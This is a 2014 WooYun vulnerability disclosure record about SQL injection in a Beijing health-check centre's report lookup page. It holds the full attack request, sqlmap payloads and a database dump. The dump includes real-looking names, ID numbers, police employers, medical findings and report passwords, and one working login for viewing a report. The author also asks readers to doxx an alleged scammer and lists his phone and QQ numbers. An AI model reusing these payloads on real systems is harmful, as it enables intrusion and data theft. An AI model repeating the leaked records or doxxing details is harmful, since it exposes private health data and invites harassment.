{"id": 48217, "wybug_id": "wooyun-2014-083780", "wybug_title": "某市体检中心漏洞泄露体检报告(包括个人详细资料、身体状况等)系列三", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "小饼仔", "wybug_date": "2014-11-19 12:31", "wybug_open_date": "2015-01-03 12:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-03：\t细节向公众公开  简要描述： 第三发来了，近50W用户的姓名,身份证号，电话，住址，公司，个人身体状况全部都有~~还有公安局的，玩了，要被跨省了！PS. 一个妹子朋友被骗了，求人肉骗子 骗子信息 电话号码：13918792971(上海) QQ: 94478959 姓名：王小新，自称在南京读过大学，貌似是南工大01届国贸，此人租房不给退押金，人跑了，打电话不接，妹子很伤心，有消息的请私信联系，感谢各位大神帮忙，妹子爆照！ 详细说明：  北京市体检中心地址：http://www.bjtjzx.com/bgcx/（审核注意下，360那边有个北京市体检网http://www.bjtjw.net/bjtjw/index.html，和北京市体检中心不是一个网站，找到这个洞很久了，一直没提交，还是赶快提交了，省的重复了）\n\n查询处存在POST注入\nPOST /bgcx/chaxun.asp HTTP/1.1Host: www.bjtjzx.comProxy-Connection: keep-aliveContent-Length: 75Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://www.bjtjzx.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36Content-Type: application/x-www-form-urlencodedDNT: 1Referer: http://www.bjtjzx.com/bgcx/default.aspAccept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4Cookie: ASPSESSIONIDCCBRSRTT=NPHFJCCBPMIFELCKAHHGDNCB; CNZZDATA1719998=cnzz_eid%3D340004604-1414754488-http%253A%252F%252Fwww.bjtjzx.com%252F%26ntime%3D1414754488; chwlaz=1414755156184; chweblog_event=1414755156199; chweblog_dir=1414755156227; ASPSESSIONIDACARQSTS=EPIHFGIDHIDEENODGBKCMMIMRA-Ver: 2.7.0RA-Sid: 65E7C870-20141014-044958-a23ba1-b78bccxingming=aaa&kahao=111&password=11&csrq1=1970&csrq2=1&Submit2=%B2%E9%D1%AF\nsqlmap\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: xingming    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: xingming=aaa' AND 9060=CONVERT(INT,(SELECT CHAR(113)+CHAR(97)+CHAR(120)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9060=9060) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(101)+CHAR(115)+CHAR(111)+CHAR(113))) AND 'KOot'='KOot&kahao=111&password=11&csrq1=1970&csrq2=1&Submit2=%B2%E9%D1%AF    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: xingming=aaa'; WAITFOR DELAY '0:0:5'--&kahao=111&password=11&csrq1=1970&csrq2=1&Submit2=%B2%E9%D1%AF---web server operating system: Windows 2003 or XPweb application technology: Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000current database:    'tijiandangan'current user is DBA:    Falseavailable databases [10]:[*] Jsytjzx[*] master[*] model[*] msdb[*] newsletter[*] Northwind[*] pubs[*] tempdb[*] tiji[*] tijianDatabase: tijiandangan+--------------------------+---------+| Table                    | Entries |+--------------------------+---------+| dbo.TT_GR_Report         | 472029  || dbo.gr_report            | 460671  || dbo.cardpwd              | 422498  || dbo.V_Net_Report_2006    | 125743  || dbo.V_Net_Report_2007    | 122527  || dbo.V_Net_Report_2008    | 117496  || dbo.V_Net_Report_2005    | 113860  || dbo.V_Net_Report_ZZ_2008 | 106342  || dbo.V_Net_Report_ZZ_2009 | 102861  || dbo.V_Net_Report_ZZ_2010 | 100690  || dbo.V_Net_Report_2009    | 99613   || dbo.V_Net_Report_ZZ_2011 | 96611   || dbo.V_Net_Report_ZZ_2012 | 94951   || dbo.V_Net_Report_ZZ_2013 | 91334   || dbo.V_Net_Report_ZZ_2014 | 87563   || dbo.V_Net_Report_2010    | 79578   || dbo.V_Net_Report_2012    | 72775   || dbo.V_Net_Report_2013    | 71778   || dbo.V_Net_Report_2014    | 69606   || dbo.chaxun_2011          | 16725   || dbo.chaxun_09            | 15387   || dbo.chaxun_2014          | 13859   || dbo.chaxun_2013          | 13127   || dbo.chaxun_2012          | 12622   || dbo.chaxun_10            | 12155   || dbo.ZZ_chaxun_13         | 2623    || dbo.ZZ_chaxun_09         | 1873    || dbo.ZZ_chaxun_08         | 1545    || dbo.ZZ_chaxun_11         | 1383    || dbo.ZZ_chaxun_10         | 1289    || dbo.ZZ_chaxun_14         | 1196    || dbo.V_Net_Report_2012_bj | 388     || dbo.V_Net_Report_2011    | 332     || dbo.sysconstraints       | 32      || dbo.tongji_09            | 19      || dbo.tongji_10            | 19      || dbo.tongji_2011          | 19      || dbo.tongji_2013          | 19      || dbo.tongji_2014          | 19      || dbo.ZZ_tongji_08         | 19      || dbo.ZZ_tongji_09         | 19      || dbo.ZZ_tongji_10         | 19      || dbo.ZZ_tongji_12         | 19      || dbo.ZZ_tongji_13         | 19      || dbo.ZZ_tongji_14         | 19      || dbo.syssegments          | 3       |+--------------------------+---------+\n看了下数据，gr_report是用户详细信息，有将近50W\nDatabase: tijiandanganTable: gr_report[22 columns]+----------+| Column   |+----------+| cardno   || CKJB     || CSRQ     || DWMC     || Flag     || GRDJID   || HYJL     || JLYS     || KH       || KSJL     || NL       || old      || password || position || RepDate  || SFZHM    || TJLX     || TJSJ     || XB       || XM       || ZJJL     || ZJYS     |+----------+泄露的信息有姓名、性别、卡号、体检小结、体检报告查询密码、身份证号码、公司等等以下部分，麻烦审核帮忙打下码举例GRDJID\tNL\tXM\tXB\tKH\told\tHYJL\tTJLX\tKSJL\tJLYS\tZJYS\tFlag\tCSRQ\tDWMC\tZJJL\tTJSJ\tCKJB\tSFZHM\tcardno\tRepDate\tpassword\tpositionZZ2014070300664001\t35\t姜南\t女\t8066080\t0\t<Table    cellSpacing=1 cellPadding=8 width=760 border=0 align=center class=hy_table><tr><Td colspan\t健康体检\t<Table cellSpacing=1 cellPadding=8 width=760 border=0 align=center class=ksjc_table><tr><Td colspan=\t薛慧峰\t项北生\t1\t09 11 1979 12:00AM\t北京市公安局(督察总队）--民警 2014\t一、右下5易位（口腔科）<BR>    建议：<BR>    拔除。<BR>二、乳腺增生：双侧乳腺腺体结构局限性紊乱，回\t07 15 2014 12:00AM\tB 级\t210202197909111000\t8066080\t07 22 2014 11:45AM\t619045\t1ZZ2014070300665001\t36\t雷挺\t男\t11092319\t0\t<Table    cellSpacing=1 cellPadding=8 width=760 border=0 align=center class=hy_table><tr><Td colspan\t健康体检\t<Table cellSpacing=1 cellPadding=8 width=760 border=0 align=center class=ksjc_table><tr><Td colspan=\t章平\t项北生\t1\t01  8 1978 12:00AM\t北京市公安局(督察总队）--民警 2014\t一、超重 腰臀比异常 （一般检查）<BR>    建议：<BR>    1、调整饮食结构，限制每日总\t07 15 2014 12:00AM\tB 级\t610113197801080000\t11092319\t07 16 2014  9:33AM\t942306\t1ZZ2014070300666001\t33\t吴熙\t男\t11092264\t0\t<Table    cellSpacing=1 cellPadding=8 width=760 border=0 align=center class=hy_table><tr><Td colspan\t健康体检\t<Table cellSpacing=1 cellPadding=8 width=760 border=0 align=center class=ksjc_table><tr><Td colspan=\t章平\t项北生\t1\t11 15 1981 12:00AM\t北京市公安局(督察总队）--民警 2014\t一、超重 腰臀比异常 （一般检查）<BR>    建议：<BR>    1、调整饮食结构，限制每日总\t07 15 2014 12:00AM\tB 级\t110221198111158000\t11092264\t07 15 2014  4:26PM\t869134\t1ZZ2014070300667001\t36\t田文杰\t男\t1029639\t0\t<Table    cellSpacing=1 cellPadding=8 width=760 border=0 align=center class=hy_table><tr><Td colspan\t健康体检\t<Table cellSpacing=1 cellPadding=8 width=760 border=0 align=center class=ksjc_table><tr><Td colspan=\t章平\t项北生\t1\t04 19 1978 12:00AM\t北京市公安局(督察总队）--民警 2014\t体检缺项<BR><BR>本次体检所查项目未见明显异常\t07 16 2014 12:00AM\tB 级\t110229197804190000\t1029639\t07 17 2014  2:10PM\t658814\t1ZZ2014070300668001\t40\t董国源\t男\t11092353\t0\t<Table    cellSpacing=1 cellPadding=8 width=760 border=0 align=center class=hy_table><tr><Td colspan\t健康体检\t<Table cellSpacing=1 cellPadding=8 width=760 border=0 align=center class=ksjc_table><tr><Td colspan=\t章平\t项北生\t1\t08  3 1974 12:00AM\t北京市公安局(督察总队）--民警 2014\t一、超重 （一般检查）<BR>    建议：<BR>    1、调整饮食结构，限制每日总热量。<BR>&nbs\t07 17 2014 12:00AM\tB 级\t110105197408037000\t11092353\t07 18 2014  7:32AM\t398951\t1\n里面的XM,KH,PASSWORD,CSRQ对应查询页面的姓名、卡号、密码、出生日期我们选取一个白雪,13074869,993661,1980 10 \n\n报告可在线查看、下载\n\n还有其他一些表，比如\nDatabase: tijiandanganTable: cardpwd[4 columns]+----------+| Column   |+----------+| cardno   || old      || password || position |+----------+\n是一些卡号密码剩下的没具体研究   漏洞证明：     修复方案：  求别跨省！   版权声明：转载请注明来源 小饼仔@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-11-24 09:51 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}